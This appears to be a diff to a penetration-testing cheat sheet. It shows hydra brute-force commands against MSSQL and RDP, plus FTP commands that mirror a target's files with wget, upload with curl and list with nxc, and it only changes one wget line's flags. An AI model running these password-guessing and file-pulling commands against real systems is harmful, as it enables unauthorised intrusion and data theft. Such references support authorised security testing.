@@ -401,7 +401,7 @@ hydra mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -t35
 hydra rdp://$TARGET -L usernames -P passwords -t35
 
 [*] (21) FTP
-wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -m -q --no-parent --cut-dirs=1 --no-directories -P ftp
+wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -np -nH -m -q -P ftp
 curl ftp://$TARGET -u '$USERNAME':'$PASSWORD' -T filename.txt
 
 nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
